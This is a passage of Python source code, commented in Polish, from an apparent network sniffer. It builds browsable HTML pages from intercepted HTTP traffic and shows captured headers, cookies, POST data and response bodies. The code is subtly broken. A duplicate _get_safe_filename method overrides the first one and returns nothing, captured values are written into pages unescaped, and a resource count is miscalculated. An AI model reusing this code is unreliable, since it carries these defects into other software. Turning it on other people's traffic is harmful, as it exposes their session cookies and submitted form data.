                    <div class="stat-item">
                        <div class="stat-value">{len(domains)}</div>
                        <div class="stat-label">Unikalne domeny</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">{len([p for d in domains.values() for p in d if p['is_https']])}</div>
                        <div class="stat-label">Strony HTTPS</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">{len([p for d in domains.values() for p in d if not p['is_https']])}</div>
                        <div class="stat-label">Strony HTTP</div>
                    </div>
                </div>
            </div>

            <div class="search-box">
                <input type="text" class="search-input" id="searchInput" placeholder="Szukaj URL...">
            </div>

    """

        # Dodaj karty dla każdej domeny
        for domain, pages in sorted_domains:
            html += f"""
            <div class="domain-card">
                <div class="domain-header">{domain} ({len(pages)} stron)</div>
                <div class="page-list">
    """

            # Sortuj strony według timestampa (jeśli dostępny)
            sorted_pages = sorted(pages, key=lambda x: x['timestamp'] if x['timestamp'] != 'unknown' else '9999-99-99',
                                  reverse=True)

            for page in sorted_pages:
                protocol_class = "https" if page['is_https'] else "http"
                protocol_text = "HTTPS" if page['is_https'] else "HTTP"

                html += f"""
                    <div class="page-item">
                        <span class="protocol-badge {protocol_class}">{protocol_text}</span>
                        <a href="{page['file_path']}" class="page-link">{page['url']}</a>
                        <span class="timestamp">{page['timestamp']}</span>
                        <span class="request-count">{page['request_count']} żądań</span>
                    </div>
    """

            html += """
                </div>
            </div>
    """

        # Dodaj skrypt wyszukiwania
        html += """
            <script>
                document.addEventListener('DOMContentLoaded', function() {
                    const searchInput = document.getElementById('searchInput');
                    const pageItems = document.querySelectorAll('.page-item');
                    const domainCards = document.querySelectorAll('.domain-card');

                    searchInput.addEventListener('input', function() {
                        const searchText = this.value.toLowerCase();

                        // Dla każdej karty domeny
                        domainCards.forEach(card => {
                            let hasVisibleItems = false;

                            // Sprawdź wszystkie elementy strony w tej karcie
                            const items = card.querySelectorAll('.page-item');
                            items.forEach(item => {
                                const link = item.querySelector('.page-link');
                                const url = link.textContent.toLowerCase();

                                if (url.includes(searchText)) {
                                    item.style.display = '';
                                    hasVisibleItems = true;
                                } else {
                                    item.style.display = 'none';
                                }
                            });

                            // Pokaż/ukryj całą kartę domeny
                            card.style.display = hasVisibleItems ? '' : 'none';
                        });
                    });
                });
            </script>
        </div>
    </body>
    </html>
    """

        return html

    def reconstruct_html_page(self, url, requests):
        """Rekonstruuje pełną stronę HTML na podstawie przechwyconych żądań

        Args:
            url (str): URL strony do rekonstrukcji
            requests (list): Lista przechwyconych żądań dla tego URL

        Returns:
            str: Zrekonstruowany kod HTML strony
        """
        if not requests:
            return f"<html><body><h1>Brak danych dla {url}</h1></body></html>"

        # Znajdź główne żądanie HTML
        main_request = None
        html_content = None

        for req in requests:
            # Sprawdź nagłówki aby znaleźć odpowiedź HTML
            headers = req.get('headers', {})
            if isinstance(headers, dict):  # Upewnij się, że headers to słownik
                content_type = headers.get('Content-Type', '')
                if isinstance(content_type, str) and 'text/html' in content_type.lower():
                    main_request = req
                    # Sprawdź czy mamy treść odpowiedzi
                    for response in req.get('responses', []):
                        if 'content' in response:
                            html_content = response['content']
                            break
                    break

        # Jeśli nie znaleziono żądania HTML, użyj pierwszego żądania
        if not main_request:
            main_request = requests[0]

        # Jeśli nie mamy treści HTML, wygeneruj zastępczą stronę
        if not html_content:
            base_domain = url.split('://', 1)[1].split('/', 1)[0] if '://' in url else url

            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>{base_domain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; }}
                    .header {{ background: #f5f5f5; padding: 15px; border-bottom: 1px solid #ddd; }}
                    .content {{ padding: 20px; }}
                    .request-info {{ margin-bottom: 20px; padding: 10px; border: 1px solid #eee; }}
                    .resource {{ margin: 5px 0; padding: 8px; background: #f9f9f9; border-radius: 4px; }}
                    .http {{ color: #e74c3c; }}
                    .https {{ color: #27ae60; }}
                    .nav-bar {{ background: #333; color: white; padding: 10px; display: flex; align-items: center; }}
                    .nav-button {{ margin-right: 10px; padding: 5px 10px; background: #555; border: none; color: white; cursor: pointer; }}
                    .url-display {{ flex-grow: 1; padding: 5px 10px; background: #444; border-radius: 3px; }}
                </style>
            </head>
            <body>
                <div class="nav-bar">
                    <button class="nav-button" id="backBtn">◀</button>
                    <button class="nav-button" id="forwardBtn">▶</button>
                    <button class="nav-button" id="homeBtn">🏠</button>
                    <div class="url-display">{url}</div>
                </div>

                <div class="header">
                    <h2>Zrekonstruowana strona: {url}</h2>
                    <p>Ta strona została zrekonstruowana na podstawie przechwyconych danych.</p>
                </div>
                <div class="content">
                    <div class="request-info">
                        <h3>Informacje o żądaniu</h3>
                        <p><strong>URL:</strong> {url}</p>
                        <p><strong>Metoda:</strong> {main_request.get('method', 'GET')}</p>
                        <p><strong>Czas:</strong> {main_request.get('timestamp', 'nieznany')}</p>
                    </div>
            """

            # Dodaj informacje o zasobach
            resource_count = 0
            html_content += "<h3>Powiązane zasoby</h3>"

            for req in requests:
                if req != main_request:
                    req_url = req.get('url', url)
                    protocol = "HTTPS" if req_url.startswith("https://") else "HTTP"
                    protocol_class = "https" if protocol == "HTTPS" else "http"

                    html_content += f"""
                    <div class="resource">
                        <span class="{protocol_class}">{protocol}</span> {req.get('method', 'GET')} {req_url}
                    </div>
                    """
                    resource_count += 1

                    # Ogranicz liczbę wyświetlanych zasobów
                    if resource_count >= 20:
                        html_content += f"<p>... oraz {len(requests) - 21} więcej zasobów</p>"
                        break

            html_content += """
                </div>
            </body>
            </html>
            """

        # Dodaj skrypt do przechwytywania kliknięć i nawigacji
        inject_script = """
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Przechwytuj kliknięcia
            document.addEventListener('click', function(e) {
                // Sprawdź czy kliknięto link
                let target = e.target;
                while (target && target.tagName !== 'A') {
                    target = target.parentElement;
                }

                if (target && target.href) {
                    console.log('Kliknięto link:', target.href);
                    // Nawigacja będzie obsługiwana przez skrypt nawigacji
                }
            });

            // Oznacz wszystkie linki
            const links = document.querySelectorAll('a');
            links.forEach(link => {
                link.style.border = '1px dashed #3498db';
                link.style.padding = '2px 4px';
                link.setAttribute('title', 'Kliknij, aby przejść do: ' + link.href);
            });
        });
        </script>
        """

        # Dodaj skrypt do kodu HTML
        if '</body>' in html_content:
            html_content = html_content.replace('</body>', inject_script + '</body>')
        elif '</html>' in html_content:
            html_content = html_content.replace('</html>', inject_script + '</body></html>')
        else:
            html_content += inject_script

        return html_content

    def browse_captured_pages(self):
        """Tworzy statyczne pliki HTML do przeglądania przechwyconych stron i uruchamia przeglądarkę"""
        if not self.captured_data:
            print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return False

        try:
            import os
            import json
            from datetime import datetime
            import webbrowser
            import shutil

            # Utwórz katalog dla przeglądarki, jeśli nie istnieje
            browser_dir = "captured_browser"
            if os.path.exists(browser_dir):
                shutil.rmtree(browser_dir)  # Usuń istniejący katalog, aby uniknąć konfliktów
            os.makedirs(browser_dir)

            # Utwórz katalog dla stron
            pages_dir = os.path.join(browser_dir, "pages")
            os.makedirs(pages_dir)

            # Przygotuj dane indeksu
            index_data = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "total_urls": len(self.captured_data),
                "total_requests": sum(len(reqs) for reqs in self.captured_data.values()),
                "pages": []
            }

            print(f"\nGenerowanie {len(self.captured_data)} stron HTML...")

            # Przetwórz wszystkie URL
            for i, (url, requests) in enumerate(self.captured_data.items()):
                if not requests:
                    continue  # Pomijaj URL bez żądań

                # Generuj nazwę pliku na podstawie URL
                safe_filename = self._get_safe_filename(url)
                page_filename = f"page_{i + 1}_{safe_filename}.html"
                page_path = os.path.join(pages_dir, page_filename)

                # Dodaj stronę do indeksu
                index_data["pages"].append({
                    "url": url,
                    "is_https": url.startswith("https://"),
                    "requests": len(requests),
                    "filename": page_filename,
                    "method": requests[0].get("method", "GET") if requests else "GET",
                    "timestamp": requests[0].get("timestamp", "unknown") if requests else "unknown"
                })

                # Generuj zawartość strony HTML
                page_html = self._generate_page_html(url, requests, i + 1, len(self.captured_data))

                # Zapisz stronę
                with open(page_path, "w", encoding="utf-8", errors="ignore") as f:
                    f.write(page_html)

                # Pokaż postęp
                print(f"Wygenerowano stronę {i + 1}/{len(self.captured_data)}: {url}")

            # Wygeneruj plik indeksu
            index_path = os.path.join(browser_dir, "index.html")
            index_html = self._generate_index_html(index_data)

            with open(index_path, "w", encoding="utf-8") as f:
                f.write(index_html)

            print(f"\nWygenerowano przeglądarkę stron w katalogu: {browser_dir}")
            print(f"Otwieram przeglądarkę z indeksem stron...")

            # Otwórz przeglądarkę z indeksem
            try:
                webbrowser.open(f"file://{os.path.abspath(index_path)}")
                print("Przeglądarka została uruchomiona.")
            except Exception as e:
                print(f"Nie udało się automatycznie otworzyć przeglądarki: {e}")
                print(f"Możesz ręcznie otworzyć plik: {index_path}")

            return True

        except Exception as e:
            print(f"Błąd podczas tworzenia przeglądarki stron: {e}")
            import traceback
            traceback.print_exc()
            return False

    def _get_safe_filename(self, url):
        """Konwertuje URL na bezpieczną nazwę pliku"""
        # Usuń protokół
        if "://" in url:
            url = url.split("://", 1)[1]

        # Ogranicz długość
        if len(url) > 50:
            url = url[:50]

        # Zamień niebezpieczne znaki
        for char in ['/', '\\', ':', '*', '?', '"', '<', '>', '|', ' ', '.']:
            url = url.replace(char, '_')

        return url

    def _generate_page_html(self, url, requests, page_num, total_pages):
        """Generuje kod HTML dla pojedynczej strony"""
        is_https = url.startswith("https://")

        # Podstawowe informacje
        page_title = f"{'🔒 ' if is_https else ''}Strona {page_num}/{total_pages}: {url}"

        # Budujemy HTML z krótszych fragmentów, aby uniknąć problemów z potrójnymi cudzysłowami
        html = "<!DOCTYPE html>\n<html>\n<head>\n"
        html += f"    <meta charset=\"UTF-8\">\n"
        html += f"    <title>{page_title}</title>\n"

        # Style CSS
        html += "    <style>\n"
        html += "        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }\n"
        html += "        .nav-bar { background: #333; color: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 100; }\n"
        html += "        .nav-button { margin-right: 10px; padding: 5px 10px; background: #555; border: none; color: white; cursor: pointer; border-radius: 3px; }\n"
        html += "        .nav-button:hover { background: #777; }\n"
        html += "        .url-display { flex-grow: 1; padding: 8px 15px; background: #444; border-radius: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }\n"
        html += "        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }\n"
        html += "        .header { background: white; padding: 20px; margin-bottom: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }\n"
        html += "        .https-notice { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 20px; }\n"
        html += "        .request-card { background: white; padding: 15px; margin-bottom: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }\n"
        html += "        .request-header { display: flex; justify-content: space-between; margin-bottom: 10px; }\n"
        html += "        .method { display: inline-block; padding: 3px 8px; border-radius: 3px; font-weight: bold; }\n"
        html += "        .get { background: #e7f3fe; color: #0c5460; }\n"
        html += "        .post { background: #d4edda; color: #155724; }\n"
        html += "        .request-details { display: none; margin-top: 10px; padding-top: 10px; border-top: 1px solid #eee; }\n"
        html += "        .show-details { background: #f8f9fa; border: 1px solid #ddd; padding: 5px 10px; border-radius: 3px; cursor: pointer; }\n"
        html += "        .show-details:hover { background: #e9ecef; }\n"
        html += "        table { width: 100%; border-collapse: collapse; margin: 10px 0; }\n"
        html += "        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }\n"
        html += "        th { background: #f2f2f2; }\n"
        html += "        .timestamp { color: #6c757d; font-size: 14px; }\n"
        html += "        .content-section { white-space: pre-wrap; overflow-x: auto; background: #f8f9fa; padding: 10px; border-radius: 3px; max-height: 300px; overflow-y: auto; }\n"
        html += "    </style>\n"
        html += "</head>\n<body>\n"

        # Pasek nawigacji
        html += "    <div class=\"nav-bar\">\n"
        html += "        <button class=\"nav-button\" onclick=\"window.location.href='../index.html'\">⬅️ Powrót</button>\n"
        html += "        <button class=\"nav-button\" onclick=\"window.history.back()\">◀ Wstecz</button>\n"
        html += "        <button class=\"nav-button\" onclick=\"window.history.forward()\">▶ Dalej</button>\n"
        html += f"        <div class=\"url-display\">{url}</div>\n"
        html += "    </div>\n"

        # Kontener główny
        html += "    <div class=\"container\">\n"
        html += "        <div class=\"header\">\n"
        html += f"            <h1>{page_title}</h1>\n"
        html += f"            <p>Liczba przechwyconych żądań: <strong>{len(requests)}</strong></p>\n"

        # Informacja o timestamp pierwszego żądania
        timestamp = requests[0].get('timestamp', 'nieznany') if requests else 'nieznany'
        html += f"            <p>Pierwsze żądanie: <span class=\"timestamp\">{timestamp}</span></p>\n"
        html += "        </div>\n"

        # Dodaj informację o HTTPS jeśli dotyczy
        if is_https:
            html += "        <div class=\"https-notice\">\n"
            html += "            <h3>🔒 To jest strona HTTPS</h3>\n"
            html += "            <p>Ta strona używa szyfrowanego połączenia HTTPS. Rzeczywista zawartość strony nie mogła zostać przechwycona ze względu na szyfrowanie.</p>\n"
            html += "            <p>Poniżej przedstawiono przechwycone żądania związane z tą stroną.</p>\n"
            html += "        </div>\n"

        # Nagłówek dla sekcji żądań
        html += "        <h2>Przechwycone żądania</h2>\n"

        # Dodaj szczegóły każdego żądania
        for i, req in enumerate(requests):
            method = req.get('method', 'GET')
            method_class = method.lower() if method.lower() in ['get', 'post'] else 'get'
            timestamp = req.get('timestamp', 'nieznany')

            html += f"        <div class=\"request-card\" id=\"request-{i + 1}\">\n"
            html += "            <div class=\"request-header\">\n"
            html += "                <div>\n"
            html += f"                    <span class=\"method {method_class}\">{method}</span>\n"
            html += f"                    <strong>{url}</strong>\n"
            html += "                </div>\n"
            html += f"                <span class=\"timestamp\">{timestamp}</span>\n"
            html += "            </div>\n"
            html += f"            <button class=\"show-details\" onclick=\"toggleDetails('details-{i + 1}')\">Pokaż szczegóły</button>\n"
            html += f"            <div class=\"request-details\" id=\"details-{i + 1}\">\n"

            # Dodaj nagłówki żądania
            headers = req.get('headers', {})
            if headers and isinstance(headers, dict):
                html += "                <h3>Nagłówki żądania</h3>\n"
                html += "                <table>\n"
                html += "                    <tr>\n"
                html += "                        <th>Nagłówek</th>\n"
                html += "                        <th>Wartość</th>\n"
                html += "                    </tr>\n"

                for key, value in headers.items():
                    html += f"                    <tr>\n"
                    html += f"                        <td>{key}</td>\n"
                    html += f"                        <td>{value}</td>\n"
                    html += f"                    </tr>\n"

                html += "                </table>\n"

            # Dodaj ciasteczka
            cookies = req.get('cookies', {})
            if cookies and isinstance(cookies, dict):
                html += "                <h3>Ciasteczka</h3>\n"
                html += "                <table>\n"
                html += "                    <tr>\n"
                html += "                        <th>Nazwa</th>\n"
                html += "                        <th>Wartość</th>\n"
                html += "                    </tr>\n"

                for key, value in cookies.items():
                    html += f"                    <tr>\n"
                    html += f"                        <td>{key}</td>\n"
                    html += f"                        <td>{value}</td>\n"
                    html += f"                    </tr>\n"

                html += "                </table>\n"

            # Dodaj dane POST
            post_data = req.get('post_data')
            if post_data:
                html += "                <h3>Dane POST</h3>\n"
                html += f"                <div class=\"content-section\">{post_data}</div>\n"

            # Dodaj odpowiedzi
            responses = req.get('responses', [])
            if responses and isinstance(responses, list):
                html += f"                <h3>Odpowiedzi ({len(responses)})</h3>\n"

                for j, resp in enumerate(responses):
                    resp_timestamp = resp.get('timestamp', 'nieznany')
                    resp_headers = resp.get('headers', {})
                    resp_content = resp.get('content', '')

                    html += "                <div style=\"border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 3px;\">\n"
                    html += f"                    <h4>Odpowiedź #{j + 1} <span class=\"timestamp\">({resp_timestamp})</span></h4>\n"

                    # Nagłówki odpowiedzi
                    if resp_headers and isinstance(resp_headers, dict):
                        html += "                    <h5>Nagłówki odpowiedzi</h5>\n"
                        html += "                    <table>\n"
                        html += "                        <tr>\n"
                        html += "                            <th>Nagłówek</th>\n"
                        html += "                            <th>Wartość</th>\n"
                        html += "                        </tr>\n"

                        for key, value in resp_headers.items():
                            html += f"                        <tr>\n"
                            html += f"                            <td>{key}</td>\n"
                            html += f"                            <td>{value}</td>\n"
                            html += f"                        </tr>\n"

                        html += "                    </table>\n"

                    # Treść odpowiedzi (ograniczona do 2000 znaków)
                    if resp_content:
                        if isinstance(resp_content, str):
                            # Ogranicz długość wyświetlanej treści
                            display_content = resp_content[:2000]
                            if len(resp_content) > 2000:
                                display_content += "... [obcięto ze względu na długość]"

                            html += "                        <h5>Treść odpowiedzi</h5>\n"
                            html += f"                        <div class=\"content-section\">{display_content}</div>\n"

                    html += "                </div>\n"

            html += "            </div>\n"
            html += "        </div>\n"

        # Dodaj skrypt JavaScript na końcu strony
        html += "    </div>\n"
        html += "    <script>\n"
        html += "        function toggleDetails(id) {\n"
        html += "            const details = document.getElementById(id);\n"
        html += "            const isVisible = details.style.display === 'block';\n"
        html += "            details.style.display = isVisible ? 'none' : 'block';\n"
        html += "            \n"
        html += "            // Zmień tekst przycisku\n"
        html += "            const button = event.target;\n"
        html += "            button.textContent = isVisible ? 'Pokaż szczegóły' : 'Ukryj szczegóły';\n"
        html += "        }\n"
        html += "    </script>\n"
        html += "</body>\n</html>"

        return html

    def _generate_index_html(self, index_data):
        """Generuje kod HTML dla strony indeksu"""
        # Pogrupuj strony według domen
        domains = {}
        for page in index_data["pages"]:
            url = page["url"]
            domain = url.split("://", 1)[1].split("/", 1)[0] if "://" in url else url

            if domain not in domains:
                domains[domain] = []

            domains[domain].append(page)

        # Posortuj domeny według liczby stron (malejąco)
        sorted_domains = sorted(domains.items(), key=lambda x: len(x[1]), reverse=True)

        # Budujemy HTML z krótszych fragmentów
        html = "<!DOCTYPE html>\n<html>\n<head>\n"
        html += "    <meta charset=\"UTF-8\">\n"
        html += "    <title>Przeglądarka zapisanych stron</title>\n"

        # Style CSS
        html += "    <style>\n"
        html += "        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }\n"
        html += "        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }\n"
        html += "        .header { background: #333; color: white; padding: 20px; margin-bottom: 20px; border-radius: 5px; }\n"
        html += "        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }\n"
        html += "        .stat-card { background: white; padding: 15px; border-radius: 5px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }\n"
        html += "        .stat-value { font-size: 24px; font-weight: bold; color: #2196F3; margin-bottom: 5px; }\n"
        html += "        .stat-label { color: #777; }\n"
        html += "        .domain-card { background: white; margin-bottom: 20px; border-radius: 5px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }\n"
        html += "        .domain-header { background: #4CAF50; color: white; padding: 10px 20px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }\n"
        html += "        .page-list { max-height: 300px; overflow-y: auto; }\n"
        html += "        .page-item { padding: 10px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; }\n"
        html += "        .page-item:hover { background: #f9f9f9; }\n"
        html += "        .page-item:last-child { border-bottom: none; }\n"
        html += "        .page-link { color: #333; text-decoration: none; flex-grow: 1; }\n"
        html += "        .page-link:hover { text-decoration: underline; }\n"
        html += "        .protocol { display: inline-block; padding: 3px 6px; border-radius: 3px; font-size: 12px; margin-right: 10px; color: white; }\n"
        html += "        .http { background: #E91E63; }\n"
        html += "        .https { background: #2196F3; }\n"
        html += "        .method { display: inline-block; padding: 2px 5px; border-radius: 3px; font-size: 11px; margin-right: 10px; }\n"
        html += "        .get { background: #e7f3fe; color: #0c5460; }\n"
        html += "        .post { background: #d4edda; color: #155724; }\n"
        html += "        .timestamp { font-size: 12px; color: #999; margin-left: 10px; }\n"
        html += "        .search-box { padding: 10px; background: white; border-radius: 5px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }\n"
        html += "        .search-input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 3px; box-sizing: border-box; }\n"
        html += "        .count-badge { background: #eee; padding: 2px 5px; border-radius: 10px; font-size: 12px; }\n"
        html += "        .toggle-button { background: none; border: none; color: white; cursor: pointer; font-size: 16px; }\n"
        html += "    </style>\n"
        html += "</head>\n<body>\n"

        # Nagłówek
        html += "    <div class=\"header\">\n"
        html += "        <h1>Przeglądarka zapisanych stron</h1>\n"
        html += f"        <p>Data wygenerowania: {index_data['timestamp']}</p>\n"
        html += "    </div>\n"

        # Kontener główny
        html += "    <div class=\"container\">\n"

        # Statystyki
        html += "        <div class=\"stats\">\n"
        html += "            <div class=\"stat-card\">\n"
        html += f"                <div class=\"stat-value\">{index_data['total_urls']}</div>\n"
        html += "                <div class=\"stat-label\">Zapisane URL</div>\n"
        html += "            </div>\n"
        html += "            <div class=\"stat-card\">\n"
        html += f"                <div class=\"stat-value\">{index_data['total_requests']}</div>\n"
        html += "                <div class=\"stat-label\">Przechwycone żądania</div>\n"
        html += "            </div>\n"
        html += "            <div class=\"stat-card\">\n"
        html += f"                <div class=\"stat-value\">{len(domains)}</div>\n"
        html += "                <div class=\"stat-label\">Unikalne domeny</div>\n"
        html += "            </div>\n"
        html += "            <div class=\"stat-card\">\n"
        html += f"                <div class=\"stat-value\">{len([p for p in index_data['pages'] if p['is_https']])}</div>\n"
        html += "                <div class=\"stat-label\">HTTPS</div>\n"
        html += "            </div>\n"
        html += "            <div class=\"stat-card\">\n"
        html += f"                <div class=\"stat-value\">{len([p for p in index_data['pages'] if not p['is_https']])}</div>\n"
        html += "                <div class=\"stat-label\">HTTP</div>\n"
        html += "            </div>\n"
        html += "        </div>\n"

        # Wyszukiwarka
        html += "        <div class=\"search-box\">\n"
        html += "            <input type=\"text\" id=\"searchInput\" class=\"search-input\" placeholder=\"Wyszukaj URL...\">\n"
        html += "        </div>\n"

        # Dodaj sekcje dla każdej domeny
        for domain, pages in sorted_domains:
            html += "        <div class=\"domain-card\">\n"
            html += "            <div class=\"domain-header\">\n"
            html += f"                <span>{domain}</span>\n"
            html += f"                <span class=\"count-badge\">{len(pages)} stron</span>\n"
            html += f"                <button class=\"toggle-button\" onclick=\"toggleDomain('{domain.replace('.', '_')}')\">[+/-]</button>\n"
            html += "            </div>\n"
            html += f"            <div class=\"page-list\" id=\"domain_{domain.replace('.', '_')}\">\n"

            # Sortuj strony według timestampa (jeśli dostępny)
            sorted_pages = sorted(pages, key=lambda x: x.get("timestamp", ""), reverse=True)

            for page in sorted_pages:
                protocol_class = "https" if page["is_https"] else "http"
                protocol_text = "HTTPS" if page["is_https"] else "HTTP"
                method = page.get("method", "GET")
                method_class = method.lower() if method.lower() in ['get', 'post'] else 'get'

                html += "                <div class=\"page-item\">\n"
                html += f"                    <span class=\"protocol {protocol_class}\">{protocol_text}</span>\n"
                html += f"                    <span class=\"method {method_class}\">{method}</span>\n"
                html += f"                    <a href=\"pages/{page['filename']}\" class=\"page-link\">{page['url']}</a>\n"
                html += f"                    <span class=\"timestamp\">{page['timestamp']}</span>\n"
                html += f"                    <span class=\"count-badge\">{page['requests']} żądań</span>\n"
                html += "                </div>\n"

            html += "            </div>\n"
            html += "        </div>\n"

        # Dodaj skrypt JavaScript
        html += "        <script>\n"
        html += "            // Funkcja wyszukiwania\n"
        html += "            document.addEventListener('DOMContentLoaded', function() {\n"
        html += "                const searchInput = document.getElementById('searchInput');\n"
        html += "                const pageItems = document.querySelectorAll('.page-item');\n"
        html += "                const domainCards = document.querySelectorAll('.domain-card');\n"
        html += "                \n"
        html += "                searchInput.addEventListener('input', function() {\n"
        html += "                    const searchText = this.value.toLowerCase();\n"
        html += "                    \n"
        html += "                    // Dla każdej karty domeny\n"
        html += "                    domainCards.forEach(card => {\n"
        html += "                        let hasVisibleItems = false;\n"
        html += "                        \n"
        html += "                        // Sprawdź wszystkie strony w tej domenie\n"
        html += "                        const items = card.querySelectorAll('.page-item');\n"
        html += "                        items.forEach(item => {\n"
        html += "                            const link = item.querySelector('.page-link');\n"
        html += "                            const url = link.textContent.toLowerCase();\n"
        html += "                            \n"
        html += "                            if (url.includes(searchText)) {\n"
        html += "                                item.style.display = '';\n"
        html += "                                hasVisibleItems = true;\n"
        html += "                            } else {\n"
        html += "                                item.style.display = 'none';\n"
        html += "                            }\n"
        html += "                        });\n"
        html += "                        \n"
        html += "                        // Pokaż/ukryj całą kartę domeny\n"
        html += "                        card.style.display = hasVisibleItems ? '' : 'none';\n"
        html += "                    });\n"
        html += "                });\n"
        html += "            });\n"
        html += "            \n"
        html += "            // Funkcja zwijania/rozwijania domeny\n"
        html += "            function toggleDomain(domainId) {\n"
        html += "                const domainList = document.getElementById('domain_' + domainId);\n"
        html += "                const isVisible = domainList.style.display !== 'none';\n"
        html += "                domainList.style.display = isVisible ? 'none' : 'block';\n"
        html += "                \n"
        html += "                // Zmień tekst przycisku\n"
        html += "                const button = event.target;\n"
        html += "                button.textContent = isVisible ? '[+]' : '[-]';\n"
        html += "            }\n"
        html += "        </script>\n"
        html += "    </div>\n"
        html += "</body>\n</html>"

        return html

    def _get_safe_filename(self, url):
        """Konwertuje URL na bezpieczną nazwę pliku"""
        # Usuń protokół
        if "://" in url:
            url = url.split("://", 1)[1]

        # Ogranicz długość
        if len(url) > 50:
            url = url[:50]

        # Zamień niebezpieczne znaki
        for char in ['/', '\\', ':', '*', '?', '"', '<', '>', '|', ' ', '.']:
            url = url.replace(char, '_')

# Uruchomienie programu
if __name__ == "__main__":
    try:
        print("Uruchamianie narzędzia do przechwytywania ruchu sieciowego...")
        sniffer = NetworkSniffer()
        sniffer.run()
    except KeyboardInterrupt:
        print("\nPrzerwano działanie programu.")
    except Exception as e:
        print(f"\nWystąpił nieoczekiwany błąd: {e}")
    finally:
        print("Wyjście z programu.")